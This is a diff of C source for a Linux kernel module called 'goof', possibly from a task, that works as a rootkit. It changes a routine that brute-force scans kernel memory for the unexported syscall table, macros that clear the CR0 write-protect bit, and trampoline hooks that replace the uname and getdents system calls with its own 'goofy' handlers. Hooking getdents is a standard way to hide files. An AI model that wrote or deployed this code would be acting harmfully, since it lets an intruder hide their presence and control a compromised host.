@@ -31,36 +31,22 @@ Task:
 #include <net/ip.h>
 #include <linux/socket.h>
 
-//Defining possible range for syscall table to exist
-#if defined(__i386__)
-#define START_CHECK 0xc0000000
-#define END_CHECK 0xd0000000
-typedef unsigned int psize;
-#else
-#define START_CHECK 0xffffffff81000000
-#define END_CHECK 0xffffffffa2000000
-typedef unsigned long psize;
-#endif
-
 //Allow and disallow writing to syscall
 #define DISABLE_W_PROTECTED_MEMORY \
-	do { \
-		preempt_disable(); \
-		write_cr0(read_cr0() & (~ 0x10000)); \
-	} while (0);
+	preempt_disable(); \
+	barrier(); \
+	write_cr0(read_cr0() & (~ 0x00010000)); 
+
 #define ENABLE_W_PROTECTED_MEMORY \
-	do { \
-		preempt_enable(); \
-		write_cr0(read_cr0() | 0x10000); \
-	} while (0);
+	write_cr0(read_cr0()); \
+	barrier(); \
+	preempt_enable();
 
-
-MODULE_LICENSE("MIT");
 
 //Declare vars
-psize *sys_call_table;
+static unsigned long *__sys_call_table;
 
-unsigned char * create_tramp(psize *dst, psize *src, unsigned int id, unsigned int h_len);
+unsigned char * create_tramp(unsigned long *dst, unsigned long *src, unsigned int id, unsigned int h_len);
 
 int HOOK_LEN = 15;
 
@@ -127,16 +113,19 @@ int (*original_uname)(struct utsname *);
 /* Find the syscall table.
    We will use this to refrence all of the syscalls that we want to overwrite.
    This is a necessary step since in recent versions of linux the syscall table is not exported.*/
-psize **find(void) {
-	psize **sctable;
-	psize i = START_CHECK;
-	while (i < END_CHECK) {
-		sctable = (psize **) i;
-		if (sctable[__NR_close] == (psize *) sys_close) {
-			return &sctable[0];
+unsigned long *find(void) {
+	unsigned long *sctable;
+	unsigned long int i = (unsigned long int)sys_close;
+	while (i < ULONG_MAX) {
+		sctable = (unsigned long *) i;
+		if (sctable[__NR_close] == (unsigned long) sys_close) {
+
+			return sctable;
 		}
+
 		i += sizeof(void *);
 	}
+
 	return NULL;
 }
 
@@ -215,7 +204,7 @@ int goofy_accept(int sockfd, struct sockaddr *addr, int *addrlen){
 
 /// @param src where original source code is coming from
 /// 	and where the new code is going
-unsigned char *create_tramp(psize *src, psize *new_func, unsigned int id, unsigned int h_len){
+unsigned char *create_tramp(unsigned long *src, unsigned long *new_func, unsigned int id, unsigned int h_len){
 	printk("[goof] hooking %p with %p\n", src, new_func);
 	unsigned char *tmp = (unsigned char *)src;
 	struct Hook *h = kmalloc(sizeof(struct Hook), GFP_KERNEL);
@@ -314,16 +303,16 @@ goof_init(void) {
 	hooks = kmalloc(sizeof(struct Hook *)*hooks_count, GFP_KERNEL);
 
 	//Find base syscall address	
-	sys_call_table = (psize *)find(); 
+	__sys_call_table = find(); 
 
 	//Update table with hooked code
 	//Regular way to hook syscall
-	//original_uname = sys_call_table[__NR_uname];
-	//sys_call_table[__NR_uname] = goofy_uname;
+	//original_uname = __sys_call_table[__NR_uname];
+	//__sys_call_table[__NR_uname] = goofy_uname;
 
 	//Trampolining way to overwrite syscall
-	create_tramp((psize*)sys_call_table[__NR_uname], (psize *)goofy_uname, 0, 16);
-	create_tramp((psize*)sys_call_table[__NR_getdents], (psize *)goofy_getdents, 1, 15);
+	create_tramp((unsigned long*)__sys_call_table[__NR_uname], (unsigned long *)goofy_uname, 0, 16);
+	create_tramp((unsigned long*)__sys_call_table[__NR_getdents], (unsigned long *)goofy_getdents, 1, 15);
 	return 0;
 }
 static void __exit
@@ -338,3 +327,4 @@ goof_exit(void) {
 module_init(goof_init);
 module_exit(goof_exit);
 
+MODULE_LICENSE("MIT");
